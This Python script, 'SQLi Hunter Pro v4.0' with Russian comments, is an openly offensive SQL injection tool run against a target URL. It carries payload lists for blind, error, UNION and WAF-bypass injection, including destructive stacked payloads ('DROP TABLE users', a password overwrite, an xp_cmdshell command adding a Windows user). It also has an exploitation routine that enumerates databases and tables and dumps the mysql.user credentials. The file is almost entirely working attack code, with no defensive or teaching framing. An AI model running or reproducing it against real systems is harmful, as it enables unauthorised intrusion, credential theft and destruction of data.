import requests
import urllib.parse
import threading
import time
import re
import json
import socket
import base64
import binascii
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import init, Fore, Style, Back
import argparse
from pathlib import Path
import secrets
import hashlib

init(autoreset=True)
requests.packages.urllib3.disable_warnings()

class SQLiHunterPro:
    def __init__(self, target, threads=100, timeout=15, output_dir="sqli_reports"):
        self.target = target.rstrip('?')
        self.threads = threads
        self.timeout = timeout
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(exist_ok=True)
        self.session = requests.Session()
        self.session.verify = False
        
        
        self.payloads = {
            'boolean': [
                "' OR 1=1--",
                "' OR '1'='1",
                "' OR 1=1#",
                "1' OR '1'='1",
                "admin'--",
                "') OR ('1'='1",
                "1 AND 1=1",
                "1' AND 1=1--"
            ],
            'time': [
                "' AND SLEEP(5)--",
                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                "1' AND IF(1=1,SLEEP(5),0)--",
                "' WAITFOR DELAY '00:00:05'--",
                "' AND 1=pg_sleep(5)--"
            ],
            'error': [
                "' AND 1=CAST(1 AS CHAR)--",
                "' AND EXTRACTVALUE(1,concat(0x7e,(SELECT @@version),0x7e))--",
                "1' AND UPDATEXML(1,concat(0x7e,version(),0x7e),1)--"
            ],
            'union': [
                "' UNION SELECT 1,2,3--",
                "' UNION SELECT NULL,@@version,NULL--",
                "' UNION SELECT user(),database(),version()--"
            ],
            'stacked': [
                "; DROP TABLE users--",
                "; UPDATE users SET password='hacked'",
                "'; EXEC xp_cmdshell('net user hacker pass /add')--"
            ],
            'waf_bypass': [
                "'/**/OR/**/1=1--",
                "'%0aOR%0a1=1--",
                "1' %23",
                "' OR 1/*comment*/=1--"
            ]
        }
        
       
        self.dbms_signatures = {
            'mysql': ['mysql', 'mariadb', 'select.*from.*information_schema'],
            'postgres': ['postgres', 'pg_', 'pg_sleep'],
            'mssql': ['microsoft', 'sql server', 'xp_cmdshell', 'waitfor'],
            'oracle': ['oracle', 'ora-', 'utl_inaddr']
        }
        
        self.results = []
        self.dbms_type = None
        self.confirmed_params = []
        
    def fingerprint_dbms(self, response):
        """Определение типа БД"""
        body_lower = response.text.lower()
        for dbms, sigs in self.dbms_signatures.items():
            for sig in sigs:
                if sig in body_lower:
                    self.dbms_type = dbms
                    return dbms
        return 'unknown'
    
    def test_boolean_param(self, base_url, param):
        """Boolean-based blind SQLi"""
        results = []
        parsed = urllib.parse.urlparse(base_url)
        query = urllib.parse.parse_qs(parsed.query)
        
        for payload in self.payloads['boolean'] + self.payloads['waf_bypass']:
            query[param] = payload
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urllib.parse.urlencode(query, doseq=True)}"
            
            try:
                start = time.time()
                resp = self.session.get(test_url, timeout=self.timeout)
                elapsed = time.time() - start
                
                
                orig_resp = self.session.get(base_url)
                if len(resp.text) != len(orig_resp.text) or resp.status_code != orig_resp.status_code:
                    results.append({
                        'type': 'BOOLEAN',
                        'payload': payload,
                        'url': test_url,
                        'status_diff': resp.status_code != orig_resp.status_code,
                        'length_diff': abs(len(resp.text) - len(orig_resp.text)),
                        'confidence': 'HIGH'
                    })
                    self.confirmed_params.append(param)
                    break
            except:
                continue
        
        return results
    
    def test_time_param(self, base_url, param):
        """Time-based blind SQLi"""
        results = []
        parsed = urllib.parse.urlparse(base_url)
        query = urllib.parse.parse_qs(parsed.query)
        
        for payload in self.payloads['time']:
            query[param] = payload
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urllib.parse.urlencode(query, doseq=True)}"
            
            try:
                start = time.time()
                resp = self.session.get(test_url, timeout=self.timeout)
                elapsed = time.time() - start
                
                if elapsed > 4:  
                    results.append({
                        'type': 'TIME_BASED',
                        'payload': payload,
                        'url': test_url,
                        'delay': f"{elapsed:.2f}s",
                        'confidence': 'CRITICAL'
                    })
                    self.confirmed_params.append(param)
                    break
            except:
                continue
        
        return results
    
    def test_union_param(self, base_url, param):
        """UNION-based SQLi"""
        results = []
        parsed = urllib.parse.urlparse(base_url)
        query = urllib.parse.parse_qs(parsed.query)
        
        for payload in self.payloads['union']:
            query[param] = payload
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urllib.parse.urlencode(query, doseq=True)}"
            
            try:
                resp = self.session.get(test_url, timeout=self.timeout)
                
                
                db_indicators = ['information_schema', 'mysql.user', 'sys.databases', 'version()']
                if any(indicator in resp.text.lower() for indicator in db_indicators):
                    results.append({
                        'type': 'UNION',
                        'payload': payload,
                        'url': test_url,
                        'dumped_data': resp.text[:200],
                        'confidence': 'CRITICAL'
                    })
                    self.confirmed_params.append(param)
                    break
            except:
                continue
        
        return results
    
    def exploit_confirmed_param(self, base_url, param):
        """Эксплуатация подтвержденной уязвимости"""
        print(f"{Fore.CYAN}[*] Эксплуатация {param}...{Style.RESET_ALL}")
        
        exploits = []
        
        
        db_enum = [
            f"' UNION SELECT 1,database(),3--",
            f"' UNION SELECT 1,schema_name,3 FROM information_schema.schemata--",
            f"' UNION SELECT 1,name,3 FROM sys.databases--"
        ]
        
          
        table_enum = [
            f"' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database()--",
            f"' UNION SELECT 1,name,3 FROM sys.tables--"
        ]
        
       
        user_dump = [
            f"' UNION SELECT 1,user(),3--",
            f"' UNION SELECT 1,user,password FROM mysql.user--"
        ]
        
        for payload_type, payloads in [('db_enum', db_enum), ('tables', table_enum), ('users', user_dump)]:
            for payload in payloads:
                parsed = urllib.parse.urlparse(base_url)
                query = urllib.parse.parse_qs(parsed.query)
                query[param] = payload
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urllib.parse.urlencode(query, doseq=True)}"
                
                try:
                    resp = self.session.get(test_url, timeout=self.timeout)
                    if len(resp.text) > 1000 or any(kw in resp.text.lower() for kw in ['user', 'table', 'database', 'schema']):
                        exploits.append({
                            'type': payload_type,
                            'payload': payload,
                            'url': test_url,
                            'response_snippet': resp.text[:300]
                        })
                except:
                    continue
        
        return exploits
    
    def run_full_attack(self):
        """Полный цикл атаки"""
        print(f"{Fore.RED + Style.BRIGHT}{'='*100}")
        print(f"{Fore.RED + Style.BRIGHT}💉 SQLi HUNTER PRO v4.0 - DATABASE OWNAGE FRAMEWORK 💉{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*100}")
        print(f"{Fore.YELLOW}🎯 Target: {self.target}{Style.RESET_ALL}")
        
       
        print(f"{Fore.CYAN}[*] Fingerprinting DBMS...{Style.RESET_ALL}")
        resp = self.session.get(self.target, timeout=self.timeout)
        self.dbms_type = self.fingerprint_dbms(resp)
        print(f"{Fore.GREEN}[+] DBMS: {self.dbms_type.upper()}{Style.RESET_ALL}")
        
        
        parsed = urllib.parse.urlparse(self.target)
        params = urllib.parse.parse_qs(parsed.query)
        print(f"{Fore.CYAN}[+] Параметры: {list(params.keys())}{Style.RESET_ALL}")
        
        
        all_results = []
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            
            futures = []
            for param in params.keys():
                futures.extend([
                    executor.submit(self.test_boolean_param, self.target, param),
                    executor.submit(self.test_time_param, self.target, param),
                    executor.submit(self.test_union_param, self.target, param)
                ])
            
            for future in as_completed(futures):
                results = future.result()
                all_results.extend(results)
        
        
        exploits = []
        for param in self.confirmed_params:
            exploits.extend(self.exploit_confirmed_param(self.target, param))
        
        self.generate_exploit_report(all_results, exploits)
    
    def print_confirmed_sqli(self, result):
        sev = Fore.RED + Style.BRIGHT if result['confidence'] == 'CRITICAL' else Fore.MAGENTA
        print(f"\n{sev}{'='*80}{Style.RESET_ALL}")
        print(f"{sev}[SQLi CONFIRMED!] {result['type']} -> {result['payload'][:60]}{Style.RESET_ALL}")
        print(f"  {Fore.YELLOW}URL: {result['url'][:80]}...{Style.RESET_ALL}")
        if result['type'] == 'TIME_BASED':
            print(f"  {Fore.RED}⏱️  Delay: {result['delay']}{Style.RESET_ALL}")
        elif result['type'] == 'UNION':
            print(f"  {Fore.GREEN}📊 Data leaked: {len(result['dumped_data'])} chars{Style.RESET_ALL}")
    
    def generate_exploit_report(self, sqli_hits, exploits):
        """Профессиональный эксплойт отчет"""
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        report = {
            'target': self.target,
            'dbms': self.dbms_type,
            'scan_time': time.strftime('%Y-%m-%d %H:%M:%S'),
            'confirmed_params': self.confirmed_params,
            'sqli_vectors': sqli_hits,
            'exploits': exploits,
            'risk': 'CRITICAL' if sqli_hits else 'CLEAN'
        }
        
        json_file = self.output_dir / f"sqli_exploit_{timestamp}.json"
        html_file = self.output_dir / f"sqli_exploit_{timestamp}.html"
        
        with open(json_file, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)
        
        
        html_template = f"""
<!DOCTYPE html>
<html>
<head><title>SQLi Exploit Report</title>
<style>body{{font-family:monospace;background:#1a1a1a;color:#00ff00}} .critical{{color:#ff0000}} .high{{color:#ffaa00}}</style>
</head>
<body>
<h1>💉 SQLi EXPLOIT REPORT</h1>
<h2>Target: {self.target}</h2>
<h2>DBMS: {self.dbms_type}</h2>
<h2>Critical: {'✅ YES' if sqli_hits else '❌ NO'}</h2>
"""
        
        if sqli_hits:
            html_template += "<h2>CONFIRMED VECTORS:</h2><ul>"
            for hit in sqli_hits:
                html_template += f"<li><b>{hit['type']}</b>: {hit['payload']}</li>"
            html_template += "</ul>"
        
        html_template += "</body></html>"
        
        with open(html_file, 'w', encoding='utf-8') as f:
            f.write(html_template)
        
        print(f"\n{Fore.GREEN + Style.BRIGHT}{'='*100}")
        print(f"📊 ОТЧЕТЫ СОЗДАНЫ:")
        print(f"   {json_file}")
        print(f"   {html_file}")
        print(f"{Fore.RED + Style.BRIGHT}🎯 Подтверждено SQLi: {len(sqli_hits)} векторов{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}📋 Уязвимые параметры: {self.confirmed_params}{Style.RESET_ALL}")
        print(f"{Fore.GREEN + Style.BRIGHT}{'='*100}")

def main():
    parser = argparse.ArgumentParser(description='💉 SQLi Hunter Pro v4.0')
    parser.add_argument('target', help='Цель (?id=1)')
    parser.add_argument('-t', '--threads', type=int, default=100, help='Потоки')
    parser.add_argument('-T', '--timeout', type=int, default=15, help='Таймаут')
    parser.add_argument('-o', '--output', default='sqli_reports', help='Папка отчетов')
    
    args = parser.parse_args()
    hunter = SQLiHunterPro(args.target, args.threads, args.timeout, args.output)
    hunter.run_full_attack()
    
    print(f"\n{Fore.CYAN}{'='*100}")
    input("Нажми Enter...")

if __name__ == "__main__":
    main()